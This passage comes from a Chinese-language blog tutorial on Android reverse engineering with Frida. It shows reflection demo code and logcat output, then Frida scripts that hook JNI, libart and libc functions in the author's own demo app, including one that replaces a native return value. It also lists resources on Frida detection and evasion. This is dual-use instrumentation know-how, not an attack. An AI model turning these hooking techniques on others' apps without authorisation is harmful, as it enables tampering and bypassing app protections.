Log.i(TAG, <span class="string">"publicStaticField.get-&gt;"</span> + valueStaticPublic);</span><br><span class="line"></span><br><span class="line">        String valuePublic = (String) publicField.get(sakuraTest);</span><br><span class="line">        Log.i(TAG, <span class="string">"publicField.get-&gt;"</span> + valuePublic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于private属性，需要设置Accessible</span></span><br><span class="line">        Field privateStaticField = testClazz3.getDeclaredField(<span class="string">"privateStaticField"</span>);</span><br><span class="line">        privateStaticField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        String valuePrivte = (String) privateStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"modified before privateStaticField.get-&gt;"</span> + valuePrivte);</span><br><span class="line"></span><br><span class="line">        privateStaticField.set(<span class="keyword">null</span>, <span class="string">"modified"</span>);</span><br><span class="line"></span><br><span class="line">        valuePrivte = (String) privateStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"modified after privateStaticField.get-&gt;"</span> + valuePrivte);</span><br><span class="line"></span><br><span class="line">        Field[] fields = testClazz3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field i : fields) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">"testClazz3.getDeclaredFields-&gt;"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得类中method相关的方法</span></span><br><span class="line">        Method publicStaticMethod = testClazz3.getDeclaredMethod(<span class="string">"publicStaticFunc"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredMethod-&gt;"</span> + publicStaticMethod);</span><br><span class="line"></span><br><span class="line">        publicStaticMethod.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Method publicMethod = testClazz3.getDeclaredMethod(<span class="string">"publicFunc"</span>, java.lang.String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredMethod-&gt;"</span> + publicMethod);</span><br><span class="line"></span><br><span class="line">        publicMethod.invoke(sakuraTest, <span class="string">" sakura"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the 'native-lib' native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringWithJNI</span><span class="params">(String context)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"sakura_test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String publicStaticField = <span class="string">"i am a publicStaticField"</span>;</span><br><span class="line">    <span class="keyword">public</span> String publicField = <span class="string">"i am a publicField"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String privateStaticField = <span class="string">"i am a privateStaticField"</span>;</span><br><span class="line">    <span class="keyword">private</span> String privateField = <span class="string">"i am a privateField"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">publicStaticFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"I`m from publicStaticFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publicFunc</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"I`m from publicFunc"</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">privateStaticFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"I`m from privateFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">privateFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"I`m from privateFunc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.784</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;<span class="class"><span class="keyword">class</span> <span class="title">myapplication</span>.<span class="title">example</span>.<span class="title">com</span>.<span class="title">ndk_demo</span>.<span class="title">Test</span></span></span><br><span class="line">12-26 23:57:11.784 17682-17682/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;class myapplication.example.com.ndk_demo.Test</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.784</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: Classloader.loadClass-&gt;myapplication.example.com.ndk_demo.Test</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredField-&gt;<span class="keyword">public</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredField-&gt;<span class="keyword">public</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: publicStaticField.get-&gt;i am a publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: publicField.get-&gt;i am a publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: modified before privateStaticField.get-&gt;i am a privateStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: modified after privateStaticField.get-&gt;modified</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> java.lang.String myapplication.example.com.ndk_demo.Test.privateField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">public</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String myapplication.example.com.ndk_demo.Test.TAG</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">private</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.privateStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredFields-&gt;<span class="keyword">public</span> <span class="keyword">static</span> java.lang.String myapplication.example.com.ndk_demo.Test.publicStaticField</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredMethod-&gt;<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> myapplication.example.com.ndk_demo.Test.publicStaticFunc()</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.785</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo D/sakura_test: I`m from publicStaticFunc</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.786</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo I/sakura: testClazz3.getDeclaredMethod-&gt;<span class="keyword">public</span> <span class="keyword">void</span> myapplication.example.com.ndk_demo.Test.publicFunc(java.lang.String)</span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">23</span>:<span class="number">57</span>:<span class="number">11.786</span> <span class="number">17682</span>-<span class="number">17682</span>/myapplication.example.com.ndk_demo D/sakura_test: I`m from publicFunc sakura</span><br></pre></td></tr></table></figure><p><code>memory list modules</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-065833.png" alt=""></p><h2 id="Frida反调试"><a href="#Frida反调试" class="headerlink" title="Frida反调试"></a>Frida反调试</h2><p>这一节的主要内容就是关于反调试的原理和如何破解反调试，重要内容还是看文章理解即可。<br>因为我并不需要做反调试相关的工作，所以部分内容略过。</p><ul><li>Frida反调试与反反调试基本思路<br>（Java层API、Native层API、Syscall)<ul><li><a href="https://github.com/qtfreet00/AntiFrida" target="_blank" rel="noopener">AntiFrida</a></li><li><a href="https://github.com/b-mueller/frida-detection-demo" target="_blank" rel="noopener">frida-detection-demo</a></li><li><a href="https://bbs.pediy.com/thread-217482.htm" target="_blank" rel="noopener">多种特征检测Frida</a></li><li><a href="https://yq.aliyun.com/articles/71120" target="_blank" rel="noopener">来自高维的对抗 - 逆向TinyTool自制</a></li><li><a href="https://bbs.pediy.com/thread-253868.htm" target="_blank" rel="noopener">Unicorn 在 Android 的应用</a></li></ul></li></ul><h2 id="Frida-native-hook-符号hook-JNI、art-amp-libc"><a href="#Frida-native-hook-符号hook-JNI、art-amp-libc" class="headerlink" title="Frida native hook : 符号hook JNI、art&amp;libc"></a>Frida native hook : 符号hook JNI、art&amp;libc</h2><h3 id="Native函数的Java-Hook及主动调用"><a href="#Native函数的Java-Hook及主动调用" class="headerlink" title="Native函数的Java Hook及主动调用"></a>Native函数的Java Hook及主动调用</h3><p>对native函数的java层hook和主动调用和普通java函数完全一致，略过。</p><h3 id="jni-h头文件导入"><a href="#jni-h头文件导入" class="headerlink" title="jni.h头文件导入"></a><code>jni.h</code>头文件导入</h3><p>导入jni.h，先search一下这个文件在哪。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;Library&#x2F;Android&#x2F;sdk$ find .&#x2F; -name &quot;jni.h&quot;</span><br><span class="line">.&#x2F;&#x2F;ndk-bundle&#x2F;sysroot&#x2F;usr&#x2F;include&#x2F;jni.h</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-103826.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error &#x2F;Users&#x2F;sakura&#x2F;Library&#x2F;Android&#x2F;sdk&#x2F;ndk-bundle&#x2F;sysroot&#x2F;usr&#x2F;include&#x2F;jni.h,27: Can&#39;t open include file &#39;stdarg.h&#39;</span><br><span class="line">Total 1 errors</span><br><span class="line">Caching &#39;Exports&#39;... ok</span><br></pre></td></tr></table></figure><p>报错，所以拷贝一份jni.h出来</p><p>将这两个头文件导入删掉<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104029.png" alt=""></p><p>导入成功<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104113.png" alt=""></p><p>现在就能识别_JNIEnv了，如图<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-104131.png" alt=""></p><h3 id="JNI函数符号hook"><a href="#JNI函数符号hook" class="headerlink" title="JNI函数符号hook"></a>JNI函数符号hook</h3><p>先查看一下导出了哪些函数。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-01-102552.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringFromJNI(</span><br><span class="line">        JNIEnv *env,</span><br><span class="line">        jobject <span class="comment">/* this */</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++"</span>;</span><br><span class="line">    LOGD(<span class="string">"sakura1328"</span>);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI(JNIEnv *env, jobject instance,</span><br><span class="line">                                                                    jstring context_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *context = env-&gt;GetStringUTFChars(context_, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> context_size = env-&gt;GetStringUTFLength(context_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGD(<span class="string">"%s\n"</span>, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    env-&gt;ReleaseStringUTFChars(context_, context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"sakura1328"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有几个需要的API。</p><ul><li>首先是找到是否so被加载，通过<code>Process.enumerateModules()</code>,这个API可以枚举被加载到内存的modules。</li><li>然后通过<code>Module.findBaseAddress(module name)</code>来查找要hook的函数所在的so的基地址，如果找不到就返回null。</li><li>然后可以通过<code>findExportByName(moduleName: string, exportName: string): NativePointer</code>来查找导出函数的绝对地址。如果不知道moduleName是什么，可以传入一个null进入，但是会花费一些时间遍历所有的module。如果找不到就返回null。</li><li>找到地址之后，就可以拦截function/instruction的执行。通过<code>Interceptor.attach</code>。使用方法见下代码。</li><li>另外为了将jstring的值打印出来，可以使用jenv的函数getStringUtfChars，就像正常的写native程序一样。<br><code>Java.vm.getEnv().getStringUtfChars(args[2], null).readCString()</code></li></ul><p>这里我是循环调用的string_with_jni，如果不循环调用，那就要主动调用一下这个函数，或者hook dlopen。<br>hook dlopen的方法在<a href="https://github.com/lasting-yang/frida_dump/blob/master/dump_dex.js" target="_blank" rel="noopener">这个代码</a>可以参考。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(JSON.stringify(Process.enumerateModules()));</span></span><br><span class="line">    <span class="keyword">var</span> libnative_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"libnative_addr is: "</span> + libnative_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (libnative_addr) &#123;</span><br><span class="line">        <span class="keyword">var</span> string_with_jni_addr = Module.findExportByName(<span class="string">"libnative-lib.so"</span>, </span><br><span class="line">        <span class="string">"Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"string_with_jni_addr is: "</span> + string_with_jni_addr)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(string_with_jni_addr, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"string_with_jni args: "</span> + args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">console</span>.log(Java.vm.getEnv().getStringUtfChars(args[<span class="number">2</span>], <span class="literal">null</span>).readCString())</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"retval:"</span>, retval)</span><br><span class="line">            <span class="built_in">console</span>.log(Java.vm.getEnv().getStringUtfChars(retval, <span class="literal">null</span>).readCString())</span><br><span class="line">            <span class="keyword">var</span> newRetval = Java.vm.getEnv().newStringUtf(<span class="string">"new retval from hook_native"</span>);</span><br><span class="line">            retval.replace(ptr(newRetval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libnative_addr is: 0x7a0842f000</span><br><span class="line">string_with_jni_addr is: 0x7a08436194</span><br><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; string_with_jni args: 0x7a106cc1c0 0x7ff0b71da4 0x7ff0b71da8</span><br><span class="line">sakura</span><br><span class="line">retval: 0x75</span><br><span class="line">sakura1328</span><br></pre></td></tr></table></figure><p>这里还写了一个hook env里的GetStringUTFChars的代码，和上面一样，不赘述了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_art</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addr_GetStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//console.log( JSON.stringify(Process.enumerateModules()));</span></span><br><span class="line">    <span class="keyword">var</span> symbols = Process.findModuleByName(<span class="string">"libart.so"</span>).enumerateSymbols();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;symbols.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].name;</span><br><span class="line">        <span class="keyword">if</span>((symbol.indexOf(<span class="string">"CheckJNI"</span>)==<span class="number">-1</span>)&amp;&amp;(symbol.indexOf(<span class="string">"JNI"</span>)&gt;=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.indexOf(<span class="string">"GetStringUTFChars"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(symbols[i].name);</span><br><span class="line">                <span class="built_in">console</span>.log(symbols[i].address);</span><br><span class="line">                addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars:"</span>, addr_GetStringUTFChars);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        Interceptor.attach(addr_GetStringUTFChars, &#123;</span><br><span class="line">            onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars OnEnter args[0],args[1]"</span>,args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">                <span class="comment">//console.log(hexdump(args[0].readPointer()));</span></span><br><span class="line">                <span class="comment">//console.log(Java.vm.tryGetEnv().getStringUtfChars(args[0]).readCString()); </span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"addr_GetStringUTFChars OnLeave"</span>,ptr(retval).readCString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JNI函数参数、返回值打印和替换"><a href="#JNI函数参数、返回值打印和替换" class="headerlink" title="JNI函数参数、返回值打印和替换"></a>JNI函数参数、返回值打印和替换</h3><ul><li>libc函数符号hook</li><li>libc函数参数、返回值打印和替换<br>hook libc的也和上面的完全一样，也不赘述了。<br>所以看到这里，究其本质就是找到导出符号和它所在的so基地址了。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_libc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pthread_create_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = Process.findModuleByName(<span class="string">"libc.so"</span>).enumerateSymbols();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;symbols.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].name;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(symbol.indexOf(<span class="string">"pthread_create"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//console.log(symbols[i].name);</span></span><br><span class="line">            <span class="comment">//console.log(symbols[i].address);</span></span><br><span class="line">            pthread_create_addr = symbols[i].address;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"pthread_create_addr,"</span>,pthread_create_addr);</span><br><span class="line">    Interceptor.attach(pthread_create_addr,&#123;</span><br><span class="line">        onEnter:<span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"pthread_create_addr args[0],args[1],args[2],args[3]:"</span>,args[<span class="number">0</span>],args[<span class="number">1</span>],args[<span class="number">2</span>],args[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"retval is:"</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Frida-native-hook-JNI-Onload-动态注册-inline-hook-native层调用栈打印"><a href="#Frida-native-hook-JNI-Onload-动态注册-inline-hook-native层调用栈打印" class="headerlink" title="Frida native hook : JNI_Onload/动态注册/inline_hook/native层调用栈打印"></a>Frida native hook : JNI_Onload/动态注册/inline_hook/native层调用栈打印</h2><p><a href="https://github.com/android/ndk-samples" target="_blank" rel="noopener">https://github.com/android/ndk-samples</a></p><h3 id="JNI-Onload-动态注册原理"><a href="#JNI-Onload-动态注册原理" class="headerlink" title="JNI_Onload/动态注册原理"></a>JNI_Onload/动态注册原理</h3><ul><li>JNI_Onload/动态注册/Frida hook RegisterNative<ul><li><a href="https://zhuanlan.kanxue.com/article-4482.htm" target="_blank" rel="noopener">JNI与动态注册</a></li><li><a href="https://eternalsakura13.com/2018/02/08/jni2/">native 方法的动态注册</a></li><li><a href="https://github.com/lasting-yang/frida_hook_libart" target="_blank" rel="noopener">Frida hook art</a></li></ul></li></ul><p>详细的内容参见我写的文章，这里只给出栗子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Log.d(TAG,stringFromJNI2());</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">stringFromJNI2</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env,</span></span></span><br><span class="line"><span class="function"><span class="params">        jclass clazz)</span> </span>&#123;</span><br><span class="line">    jclass testClass = env-&gt;FindClass(<span class="string">"myapplication/example/com/ndk_demo/Test"</span>);</span><br><span class="line">    jfieldID publicStaticField = env-&gt;GetStaticFieldID(testClass, <span class="string">"publicStaticField"</span>,</span><br><span class="line">                                                       <span class="string">"Ljava/lang/String;"</span>);</span><br><span class="line">    jstring publicStaticFieldValue = (jstring) env-&gt;GetStaticObjectField(testClass,</span><br><span class="line">                                                                         publicStaticField);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *value_ptr = env-&gt;GetStringUTFChars(publicStaticFieldValue, <span class="literal">NULL</span>);</span><br><span class="line">    LOGD(<span class="string">"now content is %s"</span>, value_ptr);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++ stringFromJNI2"</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *reserved)</span> 